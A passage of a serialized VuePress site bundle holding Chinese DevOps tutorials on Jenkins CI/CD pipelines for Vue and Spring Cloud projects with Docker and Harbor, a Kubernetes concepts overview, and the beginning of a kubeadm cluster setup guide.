configuration->nodejs\n\n\n\n3. 创建一个流水线的前端项目，根据脚本把配置补全\n\nnode {\n    stage(\'拉取代码\') {\n        checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test_vue.git\']]])\n    }\n    stage(\'打包，部署网站\') {\n        //使用nodejs的npm进行打包，这个和 以上的 name 保持一致\n        nodejs(\'nodejs12\'){\n            sh \'\'\'\n                npm install\n                npm run build\n            \'\'\'\n        }\n        //=====以下为远程调用进行项目部署========\n        sshpublisher(publishers: [sshpublisherdesc(configname: \'master_server\',transfers: [sshtransfer(cleanremote: false, excludes: \'\', execcommand: \'\',exectimeout: 120000, flatten: false, makeemptydirs: false, nodefaultexcludes:false, patternseparator: \'[, ]+\', remotedirectory: \'/usr/share/nginx/html\',remotedirectorysdf: false, removeprefix: \'dist\', sourcefiles: \'dist/**\')],usepromotiontimestamp: false, useworkspaceinpromotion: false, verbose: false)])\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n从脚本中可以看出，我们需要一个 branch 参数，还要配置 前端项目的 远程 server 地址\n\n> 这里没有使用 execcommand 的命令，而是通过 sourcefiles、removeprefix、remotedirectory，sourcefiles 代表我们 copy 哪个文件，remotedirectory 远程目录，特就是 copy 到 nginx 所在目录\n> 57-62',charsets:{cjk:!0}},{title:"Jenkins(八) Jenkins+Docker+SpringCloud微服务持续集成（下）",frontmatter:{title:"Jenkins(八) Jenkins+Docker+SpringCloud微服务持续集成（下）",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/507",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/50.Jenkins/507.Jenkins(%E5%85%AB)%20Jenkins+Docker+SpringCloud%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%EF%BC%88%E4%B8%8B%EF%BC%89.html",relativePath:"04.运维/50.Jenkins/507.Jenkins(八) Jenkins+Docker+SpringCloud微服务持续集成（下）.md",key:"v-966f9b00",path:"/jenkins/507/",headers:[{level:2,title:"优化Jenkins工程中可以选择多个微服务",slug:"优化jenkins工程中可以选择多个微服务",normalizedTitle:"优化 jenkins 工程中可以选择多个微服务",charIndex:176},{level:2,title:"优化Jenkins工程中可以选择多台生产服务器",slug:"优化jenkins工程中可以选择多台生产服务器",normalizedTitle:"优化 jenkins 工程中可以选择多台生产服务器",charIndex:269},{level:2,title:"脚本编写",slug:"脚本编写",normalizedTitle:"脚本编写",charIndex:409}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"优化Jenkins工程中可以选择多个微服务 优化Jenkins工程中可以选择多台生产服务器 脚本编写",content:'第七章中部署方案存在的问题：\n\n 1. 一次只能选择一个微服务部署\n 2. 只有一台生产者部署服务器\n 3. 每个微服务只有一个实例，容错率低\n\n优化方案：\n\n 1. 在一个 Jenkins 工程中可以选择多个微服务同时发布\n 2. 在一个 Jenkins 工程中可以选择多台生产服务器同时部署\n 3. 每个微服务都是以集群高可用形式部署\n\n\n\n\n# 优化 Jenkins 工程中可以选择多个微服务\n\n安装 Extended Choice Parameter 插件，到项目配置中，可以看到选择参数多了一个选项\n\n\n\n\n\n\n\n\n\n\n\n\n# 优化 Jenkins 工程中可以选择多台生产服务器\n\n1. 在 Manager Jenkins->Configure System->Publish over SSH-> 在添加服务器\n\n\n\n2. 在到项目配置中添加服务器选择，和工程中选择多个微服务是类似的\n\n\n\n\n\n\n\n\n# 脚本编写\n\n// 版本\ndef tag = "1.0"\n// 镜像仓库的地址\ndef harbor_url = "192.168.81.102:85"\n// 镜像仓库的项目,这里建议项目名称和jenkins的item项目名称、以及harbor的项目名称保持一致，否则用一下脚本会出问题\ndef harbor_project = "demo"\n\nnode {\n\n    // 获取当前选择的项目名称\n    def selectDProjectName = "${project_name}".split(",")\n    // 获取服务器列表\n    def selectDServers = "${publish_server}".split(",")\n\n    // 拉取代码\n    stage(\'pull code\') {\n        checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // 编译并推送镜像仓库\n    stage(\'build project\') {\n\n        for(int i=0;i<selectDProjectName.length;i++){\n\n            def project = selectDProjectName[i].split("@")[0]\n            def port = selectDProjectName[i].split("@")[1]\n            // 编译\n            sh "mvn -f ${project} clean package dockerfile:build"\n            echo "把jar上传镜像仓库"\n            def oldImageName = "${project}:latest"\n            def newImageName = "${harbor_url}/${harbor_project}/${project}:${tag}"\n            // 改名称 做规范\n            sh "docker tag ${oldImageName} ${newImageName}"\n            // 删除之前的 镜像\n            sh "docker rmi ${oldImageName}"\n            // 推送到 dockers仓库\n            withCredentials([usernamePassword(credentialsId: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordVariable: \'harbor_password\', usernameVariable: \'harbor_account\')]) {\n                // 登录\n                sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n                // 上传\n                sh "docker push ${newImageName}"\n                echo "镜像推送成功"\n            }\n            for(int k=0;k<selectDServers.length;k++){\n                // 获取服务器名称\n                def currentServerName = selectDServers[k]\n                echo "执行远程命令 /home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}"\n                sshPublisher(publishers: [sshPublisherDesc(configName: "${currentServerName}", transfers: [sshTransfer(cleanRemote: false, excludes: \'\', execCommand: "/home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}", execTimeout: 120000, flatten: false, makeEmptyDirs: false, noDefaultExcludes: false, patternSeparator: \'[, ]+\', remoteDirectory: \'\', remoteDirectorySDF: false, removePrefix: \'\', sourceFiles: \'\')], usePromotionTimestamp: false, useWorkspaceInPromotion: false, verbose: false)])\n\n            }\n        }\n    }\n}\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n',normalizedContent:'第七章中部署方案存在的问题：\n\n 1. 一次只能选择一个微服务部署\n 2. 只有一台生产者部署服务器\n 3. 每个微服务只有一个实例，容错率低\n\n优化方案：\n\n 1. 在一个 jenkins 工程中可以选择多个微服务同时发布\n 2. 在一个 jenkins 工程中可以选择多台生产服务器同时部署\n 3. 每个微服务都是以集群高可用形式部署\n\n\n\n\n# 优化 jenkins 工程中可以选择多个微服务\n\n安装 extended choice parameter 插件，到项目配置中，可以看到选择参数多了一个选项\n\n\n\n\n\n\n\n\n\n\n\n\n# 优化 jenkins 工程中可以选择多台生产服务器\n\n1. 在 manager jenkins->configure system->publish over ssh-> 在添加服务器\n\n\n\n2. 在到项目配置中添加服务器选择，和工程中选择多个微服务是类似的\n\n\n\n\n\n\n\n\n# 脚本编写\n\n// 版本\ndef tag = "1.0"\n// 镜像仓库的地址\ndef harbor_url = "192.168.81.102:85"\n// 镜像仓库的项目,这里建议项目名称和jenkins的item项目名称、以及harbor的项目名称保持一致，否则用一下脚本会出问题\ndef harbor_project = "demo"\n\nnode {\n\n    // 获取当前选择的项目名称\n    def selectdprojectname = "${project_name}".split(",")\n    // 获取服务器列表\n    def selectdservers = "${publish_server}".split(",")\n\n    // 拉取代码\n    stage(\'pull code\') {\n        checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // 编译并推送镜像仓库\n    stage(\'build project\') {\n\n        for(int i=0;i<selectdprojectname.length;i++){\n\n            def project = selectdprojectname[i].split("@")[0]\n            def port = selectdprojectname[i].split("@")[1]\n            // 编译\n            sh "mvn -f ${project} clean package dockerfile:build"\n            echo "把jar上传镜像仓库"\n            def oldimagename = "${project}:latest"\n            def newimagename = "${harbor_url}/${harbor_project}/${project}:${tag}"\n            // 改名称 做规范\n            sh "docker tag ${oldimagename} ${newimagename}"\n            // 删除之前的 镜像\n            sh "docker rmi ${oldimagename}"\n            // 推送到 dockers仓库\n            withcredentials([usernamepassword(credentialsid: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordvariable: \'harbor_password\', usernamevariable: \'harbor_account\')]) {\n                // 登录\n                sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n                // 上传\n                sh "docker push ${newimagename}"\n                echo "镜像推送成功"\n            }\n            for(int k=0;k<selectdservers.length;k++){\n                // 获取服务器名称\n                def currentservername = selectdservers[k]\n                echo "执行远程命令 /home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}"\n                sshpublisher(publishers: [sshpublisherdesc(configname: "${currentservername}", transfers: [sshtransfer(cleanremote: false, excludes: \'\', execcommand: "/home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}", exectimeout: 120000, flatten: false, makeemptydirs: false, nodefaultexcludes: false, patternseparator: \'[, ]+\', remotedirectory: \'\', remotedirectorysdf: false, removeprefix: \'\', sourcefiles: \'\')], usepromotiontimestamp: false, useworkspaceinpromotion: false, verbose: false)])\n\n            }\n        }\n    }\n}\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n',charsets:{cjk:!0}},{title:"kubernetes(一) 概念及介绍",frontmatter:{title:"kubernetes(一) 概念及介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/600",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/600.kubernetes(%E4%B8%80)%20%E6%A6%82%E5%BF%B5%E5%8F%8A%E4%BB%8B%E7%BB%8D.html",relativePath:"04.运维/60.Kubernetes/600.kubernetes(一) 概念及介绍.md",key:"v-212cb943",path:"/kubernetes/600/",headers:[{level:2,title:"1.1 应用部署方式演变",slug:"_1-1-应用部署方式演变",normalizedTitle:"1.1 应用部署方式演变",charIndex:2},{level:2,title:"1.2 kubernetes简介",slug:"_1-2-kubernetes简介",normalizedTitle:"1.2 kubernetes 简介",charIndex:661},{level:2,title:"1.3 kubernetes组件",slug:"_1-3-kubernetes组件",normalizedTitle:"1.3 kubernetes 组件",charIndex:1085},{level:2,title:"1.4 kubernetes概念",slug:"_1-4-kubernetes概念",normalizedTitle:"1.4 kubernetes 概念",charIndex:2074}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"1.1 应用部署方式演变 1.2 kubernetes简介 1.3 kubernetes组件 1.4 kubernetes概念",content:"# 1.1 应用部署方式演变\n\n在部署应用程序的方式上，主要经历了三个时代：\n\n * 传统部署：互联网早期，会直接将应用程序部署在物理机上\n   \n   > 优点：简单，不需要其它技术的参与\n   > 缺点：不能为应用程序定义资源使用边界，很难合理地分配计算资源，而且程序之间容易产生影响\n\n * 虚拟化部署：可以在一台物理机上运行多个虚拟机，每个虚拟机都是独立的一个环境\n   \n   > 优点：程序环境不会相互产生影响，提供了一定程度的安全性\n   > 缺点：增加了操作系统，浪费了部分资源\n\n * 容器化部署：与虚拟化类似，但是共享了操作系统\n   \n   > 优点：\n   > 可以保证每个容器拥有自己的文件系统、CPU、内存、进程空间等\n   > 运行应用程序所需要的资源都被容器包装，并和底层基础架构解耦\n   > 容器化的应用程序可以跨云服务商、跨 Linux 操作系统发行版进行部署\n\n\n\n容器化部署方式给带来很多的便利，但是也会出现一些问题，比如说：\n\n * 一个容器故障停机了，怎么样让另外一个容器立刻启动去替补停机的容器\n * 当并发访问量变大的时候，怎么样做到横向扩展容器数量\n\n这些容器管理的问题统称为容器编排问题，为了解决这些容器编排问题，就产生了一些容器编排的软件：\n\n * Swarm：Docker 自己的容器编排工具\n * Mesos：Apache 的一个资源统一管控的工具，需要和 Marathon 结合使用\n * Kubernetes：Google 开源的的容器编排工具\n\n\n\n\n# 1.2 kubernetes 简介\n\n\n\nkubernetes，是一个全新的基于容器技术的分布式架构领先方案，是谷歌严格保密十几年的秘密武器 ----Borg 系统的一个开源版本，于 2014 年 9 月发布第一个版本，2015 年 7 月发布第一个正式版本。\n\nkubernetes 的本质是一组服务器集群，它可以在集群的每个节点上运行特定的程序，来对节点中的容器进行管理。目的是实现资源管理的自动化，主要提供了如下的主要功能：\n\n * 自我修复：一旦某一个容器崩溃，能够在 1 秒中左右迅速启动新的容器\n * 弹性伸缩：可以根据需要，自动对集群中正在运行的容器数量进行调整\n * 服务发现：服务可以通过自动发现的形式找到它所依赖的服务\n * 负载均衡：如果一个服务起动了多个容器，能够自动实现请求的负载均衡\n * 版本回退：如果发现新发布的程序版本有问题，可以立即回退到原来的版本\n * 存储编排：可以根据容器自身的需求自动创建存储卷\n\n\n# 1.3 kubernetes 组件\n\n一个 kubernetes 集群主要是由控制节点 (master)、** 工作节点 (node)** 构成，每个节点上都会安装不同的组件。\n\nmaster：集群的控制平面，负责集群的决策 (管理)\n\n> ApiServer : 资源操作的唯一入口，接收用户输入的命令，提供认证、授权、API 注册和发现等机制\n> Scheduler : 负责集群资源调度，按照预定的调度策略将 Pod 调度到相应的 node 节点上\n> ControllerManager : 负责维护集群的状态，比如程序部署安排、故障检测、自动扩展、滚动更新等\n> Etcd ：负责存储集群中各种资源对象的信息\n\nnode：集群的数据平面，负责为容器提供运行环境 (干活)\n\n> Kubelet : 负责维护容器的生命周期，即通过控制 docker，来创建、更新、销毁容器\n> KubeProxy : 负责提供集群内部的服务发现和负载均衡\n> Docker : 负责节点上容器的各种操作\n\n\n\n下面，以部署一个 nginx 服务来说明 kubernetes 系统各个组件调用关系：\n\n 1. 首先要明确，一旦 kubernetes 环境启动之后，master 和 node 都会将自身的信息存储到 etcd 数据库中\n 2. 一个 nginx 服务的安装请求会首先被发送到 master 节点的 apiServer 组件\n 3. apiServer 组件会调用 scheduler 组件来决定到底应该把这个服务安装到哪个 node 节点上，在此时，它会从 etcd 中读取各个 node 节点的信息，然后按照一定的算法进行选择，并将结果告知 apiServer\n 4. apiServer 调用 controller-manager 去调度 Node 节点安装 nginx 服务\n 5. kubelet 接收到指令后，会通知 docker，然后由 docker 来启动一个 nginx 的 pod，pod 是 kubernetes 的最小操作单元，容器必须跑在 pod 中至此，\n 6. 一个 nginx 服务就运行了，如果需要访问 nginx，就需要通过 kube-proxy 来对 pod 产生访问的代理这样，外界用户就可以访问集群中的 nginx 服务了\n\n\n# 1.4 kubernetes 概念\n\nMaster：集群控制节点，每个集群需要至少一个 master 节点负责集群的管控\nNode：工作负载节点，由 master 分配容器到这些 node 工作节点上，然后 node 节点上的 docker 负责容器的运行\nPod：kubernetes 的最小控制单元，容器都是运行在 pod 中的，一个 pod 中可以有 1 个或者多个容器\nController：控制器，通过它来实现对 pod 的管理，比如启动 pod、停止 pod、伸缩 pod 的数量等等\nService：pod 对外服务的统一入口，下面可以维护者同一类的多个 pod\nLabel：标签，用于对 pod 进行分类，同一类 pod 会拥有相同的标签\nNameSpace：命名空间，用来隔离 pod 的运行环境\n\n",normalizedContent:"# 1.1 应用部署方式演变\n\n在部署应用程序的方式上，主要经历了三个时代：\n\n * 传统部署：互联网早期，会直接将应用程序部署在物理机上\n   \n   > 优点：简单，不需要其它技术的参与\n   > 缺点：不能为应用程序定义资源使用边界，很难合理地分配计算资源，而且程序之间容易产生影响\n\n * 虚拟化部署：可以在一台物理机上运行多个虚拟机，每个虚拟机都是独立的一个环境\n   \n   > 优点：程序环境不会相互产生影响，提供了一定程度的安全性\n   > 缺点：增加了操作系统，浪费了部分资源\n\n * 容器化部署：与虚拟化类似，但是共享了操作系统\n   \n   > 优点：\n   > 可以保证每个容器拥有自己的文件系统、cpu、内存、进程空间等\n   > 运行应用程序所需要的资源都被容器包装，并和底层基础架构解耦\n   > 容器化的应用程序可以跨云服务商、跨 linux 操作系统发行版进行部署\n\n\n\n容器化部署方式给带来很多的便利，但是也会出现一些问题，比如说：\n\n * 一个容器故障停机了，怎么样让另外一个容器立刻启动去替补停机的容器\n * 当并发访问量变大的时候，怎么样做到横向扩展容器数量\n\n这些容器管理的问题统称为容器编排问题，为了解决这些容器编排问题，就产生了一些容器编排的软件：\n\n * swarm：docker 自己的容器编排工具\n * mesos：apache 的一个资源统一管控的工具，需要和 marathon 结合使用\n * kubernetes：google 开源的的容器编排工具\n\n\n\n\n# 1.2 kubernetes 简介\n\n\n\nkubernetes，是一个全新的基于容器技术的分布式架构领先方案，是谷歌严格保密十几年的秘密武器 ----borg 系统的一个开源版本，于 2014 年 9 月发布第一个版本，2015 年 7 月发布第一个正式版本。\n\nkubernetes 的本质是一组服务器集群，它可以在集群的每个节点上运行特定的程序，来对节点中的容器进行管理。目的是实现资源管理的自动化，主要提供了如下的主要功能：\n\n * 自我修复：一旦某一个容器崩溃，能够在 1 秒中左右迅速启动新的容器\n * 弹性伸缩：可以根据需要，自动对集群中正在运行的容器数量进行调整\n * 服务发现：服务可以通过自动发现的形式找到它所依赖的服务\n * 负载均衡：如果一个服务起动了多个容器，能够自动实现请求的负载均衡\n * 版本回退：如果发现新发布的程序版本有问题，可以立即回退到原来的版本\n * 存储编排：可以根据容器自身的需求自动创建存储卷\n\n\n# 1.3 kubernetes 组件\n\n一个 kubernetes 集群主要是由控制节点 (master)、** 工作节点 (node)** 构成，每个节点上都会安装不同的组件。\n\nmaster：集群的控制平面，负责集群的决策 (管理)\n\n> apiserver : 资源操作的唯一入口，接收用户输入的命令，提供认证、授权、api 注册和发现等机制\n> scheduler : 负责集群资源调度，按照预定的调度策略将 pod 调度到相应的 node 节点上\n> controllermanager : 负责维护集群的状态，比如程序部署安排、故障检测、自动扩展、滚动更新等\n> etcd ：负责存储集群中各种资源对象的信息\n\nnode：集群的数据平面，负责为容器提供运行环境 (干活)\n\n> kubelet : 负责维护容器的生命周期，即通过控制 docker，来创建、更新、销毁容器\n> kubeproxy : 负责提供集群内部的服务发现和负载均衡\n> docker : 负责节点上容器的各种操作\n\n\n\n下面，以部署一个 nginx 服务来说明 kubernetes 系统各个组件调用关系：\n\n 1. 首先要明确，一旦 kubernetes 环境启动之后，master 和 node 都会将自身的信息存储到 etcd 数据库中\n 2. 一个 nginx 服务的安装请求会首先被发送到 master 节点的 apiserver 组件\n 3. apiserver 组件会调用 scheduler 组件来决定到底应该把这个服务安装到哪个 node 节点上，在此时，它会从 etcd 中读取各个 node 节点的信息，然后按照一定的算法进行选择，并将结果告知 apiserver\n 4. apiserver 调用 controller-manager 去调度 node 节点安装 nginx 服务\n 5. kubelet 接收到指令后，会通知 docker，然后由 docker 来启动一个 nginx 的 pod，pod 是 kubernetes 的最小操作单元，容器必须跑在 pod 中至此，\n 6. 一个 nginx 服务就运行了，如果需要访问 nginx，就需要通过 kube-proxy 来对 pod 产生访问的代理这样，外界用户就可以访问集群中的 nginx 服务了\n\n\n# 1.4 kubernetes 概念\n\nmaster：集群控制节点，每个集群需要至少一个 master 节点负责集群的管控\nnode：工作负载节点，由 master 分配容器到这些 node 工作节点上，然后 node 节点上的 docker 负责容器的运行\npod：kubernetes 的最小控制单元，容器都是运行在 pod 中的，一个 pod 中可以有 1 个或者多个容器\ncontroller：控制器，通过它来实现对 pod 的管理，比如启动 pod、停止 pod、伸缩 pod 的数量等等\nservice：pod 对外服务的统一入口，下面可以维护者同一类的多个 pod\nlabel：标签，用于对 pod 进行分类，同一类 pod 会拥有相同的标签\nnamespace：命名空间，用来隔离 pod 的运行环境\n\n",charsets:{cjk:!0}},{title:"kubernetes(二) 集群环境搭建",frontmatter:{title:"kubernetes(二) 集群环境搭建",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/601",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/601.kubernetes(%E4%BA%8C)%20%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",relativePath:"04.运维/60.Kubernetes/601.kubernetes(二) 集群环境搭建.md",key:"v-80701660",path:"/kubernetes/601/",headers:[{level:2,title:"1 前置知识点",slug:"_1-前置知识点",normalizedTitle:"1 前置知识点",charIndex:2},{level:3,title:"1.2 安装方式",slug:"_1-2-安装方式",normalizedTitle:"1.2 安装方式",charIndex:158},{level:3,title:"1.3 kubeadm 部署方式介绍",slug:"_1-3-kubeadm-部署方式介绍",normalizedTitle:"1.3 kubeadm 部署方式介绍",charIndex:370},{level:3,title:"1.4 安装要求",slug:"_1-4-安装要求",normalizedTitle:"1.4 安装要求",charIndex:590},{level:3,title:"1.5 最终目标",slug:"_1-5-最终目标",normalizedTitle:"1.5 最终目标",charIndex:770},{level:2,title:"2 安装部署",slug:"_2-安装部署",normalizedTitle:"2 安装部署",charIndex:935},{level:3,title:"2.1 hostname及解析",slug:"_2-1-hostname及解析",normalizedTitle:"2.1 hostname 及解析",charIndex:1237},{level:3,title:"2.2 时间同步",slug:"_2-2-时间同步",normalizedTitle:"2.2 时间同步",charIndex:1537},{level:3,title:"2.3 禁用iptables 和 firewalld 服务",slug:"_2-3-禁用iptables-和-firewalld-服务",normalizedTitle:"2.3 禁用 iptables 和 firewalld 服务",charIndex:1763},{level:3,title:"2.4 禁用 selinux",slug:"_2-4-禁用-selinux",normalizedTitle:"2.4 禁用 selinux",charIndex:2048},{level:3,title:"2.5 禁swap用分区",slug:"_2-5-禁swap用分区",normalizedTitle:"2.5 禁 swap 用分区",charIndex:2197},{level:3,title:"2.6 修改linxu的内核参数",slug:"_2-6-修改linxu的内核参数",normalizedTitle:"2.6 修改 linxu 的内核参数",charIndex:2526},{level:3,title:"2.7 配置 ipvs",slug:"_2-7-配置-ipvs",normalizedTitle:"2.7 配置 ipvs",charIndex:3153},{level:3,title:"2.8 docker 安装",slug:"_2-8-docker-安装",normalizedTitle:"2.8 docker 安装",charIndex:3786},{level:3,title:"2.9 安装kubernetes组件",slug:"_2-9-安装kubernetes组件",normalizedTitle:"2.9 安装 kubernetes 组件",charIndex:4703},{level:3,title:"2.10 集群初始化",slug:"_2-10-集群初始化",normalizedTitle:"2.10 集群初始化",charIndex:5281},{level:4,title:"准备镜像",slug:"准备镜像",normalizedTitle:"准备镜像",charIndex:5295},{level:4,title:"初始化",slug:"初始化",normalizedTitle:"初始化",charIndex:5288},{level:3,title:"2.11 安装网络插件",slug:"_2-11-安装网络插件",normalizedTitle:"2.11 安装网络插件",charIndex:6784},{level:4,title:"master 操作",slug:"master-操作",normalizedTitle:"master 操作",charIndex:6869},{level:2,title:"服务部署",slug:"服务部署",normalizedTitle:"服务部署",charIndex:23743}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"1 前置知识点 1.2 安装方式 1.3 kubeadm 部署方式介绍 1.4 安装要求 1.5 最终目标 2 安装部署 2.1 hostname及解析 2.2 时间同步 2.3 禁用iptables 和 firewalld 服务 2.4 禁用 selinux 2.5 禁swap用分区 2.6 修改linxu的内核参数 2.7 配置 ipvs 2.8 docker 安装 2.9 安装kubernetes组件 2.10 集群初始化 准备镜像 初始化 2.11 安装网络插件 master 操作 服务部署",content:'# 1 前置知识点\n\nKubernetes 集群大体上分为两类：一主多从 和 多主多从。\n\n * 一主多从：一台 Mater 节点和多台 Node 节点，搭建简单，但是由单机故障风险，适合用于测试环境\n * 多主多从：多台 Master 节点和多台 Node 节点，搭建麻烦，安全性高，适用于生产环境。\n\n\n\n\n# 1.2 安装方式\n\nKubernetes 多有多种部署方式，目前主流的方式由 kubeadm、minikube、二进制包\n\n * minikube：一个用于快速搭建单节点 kubernetes 的工具\n * kubeadm：一个用快速搭建 kubernetes 集群的工具\n * 二进制包：从官网下载每个组件的二进制包，以此去安装，此方式对于理解 kubernetes 组件更加有效\n\n> 新手推荐 kubeadm\n\n\n# 1.3 kubeadm 部署方式介绍\n\nkubeadm 是官方社区推出的一个用于快速部署 kubernetes 集群的工具，这个工具能通过两条指令完成一个 kubernetes 集群的部署：\n\n * 创建一个 Master 节点 kubeadm init\n * 将 Node 节点加入到当前集群中 $ kubeadm join <Master 节点的 IP 和端口>\n\n> kubeadm 安装集群要求 centos7.5 及以上\n\n\n# 1.4 安装要求\n\n在开始之前，部署 Kubernetes 集群机器需要满足以下几个条件：\n\n * 一台或多台机器，操作系统 CentOS7.x-86_x64\n * 硬件配置：2GB 或更多 RAM，2 个 CPU 或更多 CPU，硬盘 30GB 或更多\n * 集群中所有机器之间网络互通\n * 可以访问外网，需要拉取镜像\n * 禁止 swap 分区\n\n\n# 1.5 最终目标\n\n * 在所有节点上安装 Docker 和 kubeadm\n * 部署 Kubernetes Master\n * 部署容器网络插件\n * 部署 Kubernetes Node，将节点加入 Kubernetes 集群中\n * 部署 Dashboard Web 页面，可视化查看 Kubernetes 资源\n\n\n# 2 安装部署\n\n\n\n角色       HOSTNAME   IP               组件\nmaster   node101    192.168.81.101   docker，kubectl，kubeadm，kubelet\nnode1    node102    192.168.81.102   docker，kubectl，kubeadm，kubelet\nnode2    node103    192.168.81.103   docker，kubectl，kubeadm，kubelet\n\n> 以下没有特定说明在 Master 还是 Node 上操作，默认全部节点需要操作。\n\n\n# 2.1 hostname 及解析\n\n不管搭建设什么集群，切记设置好 hostname，比较方便。两个步骤完成设置：\n\n 1. 临时设置。hostname 节点名称\n 2. vim /etc/hostname\n\n设置完成后要添加解析 hostname 主机名的 IP 映射，vim /etc/hosts 直接修改\n\n192.168.81.101  node101\n192.168.81.102  node102\n192.168.81.103  node103  \n\n\n1\n2\n3\n\n\nhostname node101\n\nvim /etc/hostname\nnode101\n\n\n1\n2\n3\n4\n\n\n\n# 2.2 时间同步\n\nKubernetes 要求据群众的节点时间必须精确一致，这里直接使用 chronyd 服务从网络同步时间。企业中建议配置内部的时间同步服务器。\n\n# 启动chronyd服务\nsystemctl start chronyd\n# 设置chronyd服务开机自启动\nsystemctl enable chronyd\n# chronyd 服务启动稍等几秒钟，就可以使用data命令验证时间了\ndate\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.3 禁用 iptables 和 firewalld 服务\n\nKubernetes 和 docker 在运行中会产生大量的 iptables 规则，为了不让系统规则跟他们混淆，直接关闭系统的规则，生产系统建议开启，需要开放哪些端口或者 IP，手动配置。\n\n# 关闭 firewalld 服务\nsystemctl stop firewalld\nsystemctl disable firewalld\n# 关闭iptanles服务\nsystemctl stop iptables\nsystemctl disable iptables\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.4 禁用 selinux\n\nselinux 是 linux 系统下的一个安全服务，如果不关闭它，在安装集群中可能会被限制\n\n# 临时关闭\nsetenforce 0\n# 永久禁用\nvim /etc/selinux/config\nSELINUX=disabled\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.5 禁 swap 用分区\n\nswap 分区指的是虚拟内存分区，它的作用是在物理内存使用完之后，将磁盘空间虚拟成内存来使用，启用 swap 设备会对系统的性能产生非常负面的影响，因此 Kubernetes 要求每个节点都要禁用 swap 设备，但是如果因为某些原因确实不能关闭 swap 分区，就需要在集群安装的过程中通过明确的参数进行配置说明。\n\n# 临时关闭\nswapoff -a\n\n# 永久关闭，编辑分区配置文件 /etc/fstab，注释掉 wap 分区一行\n#/dev/mapper/centos-swap swap                    swap    defaults        0 0\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.6 修改 linxu 的内核参数\n\n# 修改linux的内核参数，添加网桥过滤和地址转发功能\n# 编辑 /etc/sysctl.d/k8s.conf 文件，添加如下配置：\nnet.bridge.bridge-nf-call-iptables=1\nnet.bridge.bridge-nf-call-ip6tables=1\nnet.ipv4.ip_forward=1\nnet.ipv4.tcp_tw_recycle=0\nvm.swappiness=0\nvm.overcommit_memory=1\nvm.panic_on_oom=0\nfs.inotify.max_user_watches=89100\nfs.file-max=52706963\nfs.nr_open=52706963\nnet.ipv6.conf.all.disable_ipv6=1\nnet.netfilter.nf_conntrack_max=2310720\n\n# 加载网桥过滤模块\nmodprobe br_netfilter\nmodprobe ip_conntrack\n# 配置完成后重新加载配置文件\nsysctl -p /etc/sysctl.d/k8s.conf\n# 查看网桥过滤模块是否添加成功\nlsmod | grep br_netfilter\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.7 配置 ipvs\n\n在 Kubernetes 中 service 有两种代理模型，一种是基于 iptables 的，一种是基于 ipvs 的，两者比较的话，ipvs 的性能明显更要高一些，但是如果要使用它，需要手动载入 ipvs 模块\n\n# 安装 ipset 和 ipvsadm \nyum install ipset ipvsadm -y\n\n# 添加需要加载得模块写入脚本文件\ncat <<EOF > /etc/sysconfig/modules/ipvs.modules\n#!/bin/bash\nmodprobe -- ip_vs\nmodprobe -- ip_vs_rr\nmodprobe -- ip_vs_wrr\nmodprobe -- ip_vs_sh\nmodprobe -- nf_conntrack_ipv4\nmodprobe -- br_netfilter\nEOF\n\n# 为脚本文件添加执行权限\nchmod +x /etc/sysconfig/modules/ipvs.modules\n\n# 